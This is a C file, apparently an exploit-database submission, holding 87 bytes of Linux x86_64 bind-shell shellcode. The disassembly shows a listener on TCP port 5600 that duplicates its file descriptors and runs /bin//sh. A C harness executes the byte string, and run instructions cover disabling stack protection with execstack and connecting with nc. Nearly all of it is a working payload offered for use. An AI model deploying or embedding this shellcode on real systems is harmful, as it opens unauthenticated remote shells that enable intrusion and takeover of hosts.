/*
---------------------------------------------------------------------------------------------------

Linux/x86_64 - Bind 5600 TCP Port - shellcode - 87 bytes

Ajith Kp [ http://fb.com/ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]

Om Asato Maa Sad-Gamaya |
Tamaso Maa Jyotir-Gamaya |
Mrtyor-Maa Amrtam Gamaya |
Om Shaantih Shaantih Shaantih |

---------------------------------------------------------------------------------------------------
Disassembly of section .text:

0000000000400080 <.text>:
  400080:	48 31 c0             	xor    %rax,%rax
  400083:	48 31 d2             	xor    %rdx,%rdx
  400086:	48 31 f6             	xor    %rsi,%rsi
  400089:	ff c6                	inc    %esi
  40008b:	6a 29                	pushq  $0x29
  40008d:	58                   	pop    %rax
  40008e:	6a 02                	pushq  $0x2
  400090:	5f                   	pop    %rdi
  400091:	0f 05                	syscall
  400093:	48 97                	xchg   %rax,%rdi
  400095:	6a 02                	pushq  $0x2
  400097:	66 c7 44 24 02 15 e0 	movw   $0xe015,0x2(%rsp)
  40009e:	54                   	push   %rsp
  40009f:	5e                   	pop    %rsi
  4000a0:	52                   	push   %rdx
  4000a1:	6a 31                	pushq  $0x31
  4000a3:	58                   	pop    %rax
  4000a4:	6a 10                	pushq  $0x10
  4000a6:	5a                   	pop    %rdx
  4000a7:	0f 05                	syscall
  4000a9:	5e                   	pop    %rsi
  4000aa:	6a 32                	pushq  $0x32
  4000ac:	58                   	pop    %rax
  4000ad:	0f 05                	syscall
  4000af:	6a 2b                	pushq  $0x2b
  4000b1:	58                   	pop    %rax
  4000b2:	0f 05                	syscall
  4000b4:	48 97                	xchg   %rax,%rdi
  4000b6:	6a 03                	pushq  $0x3
  4000b8:	5e                   	pop    %rsi
  4000b9:	ff ce                	dec    %esi
  4000bb:	b0 21                	mov    $0x21,%al
  4000bd:	0f 05                	syscall
  4000bf:	75 f8                	jne    0x4000b9
  4000c1:	f7 e6                	mul    %esi
  4000c3:	52                   	push   %rdx
  4000c4:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
  4000cb:	2f 73 68
  4000ce:	53                   	push   %rbx
  4000cf:	48 8d 3c 24          	lea    (%rsp),%rdi
  4000d3:	b0 3b                	mov    $0x3b,%al
  4000d5:	0f 05                	syscall

---------------------------------------------------------------------------------------------------

How To Run

$ gcc -o bind_shell bind_shell.c
$ execstack -s bind_shell
$ ./bind_shell

How to Connect

$ nc <HOST IP ADDRESS> 5600

Eg:

$ nc 127.0.0.1 5600

---------------------------------------------------------------------------------------------------
*/
#include <stdio.h>
char sh[]="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
void main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) sh;
	(int)(*func)();
}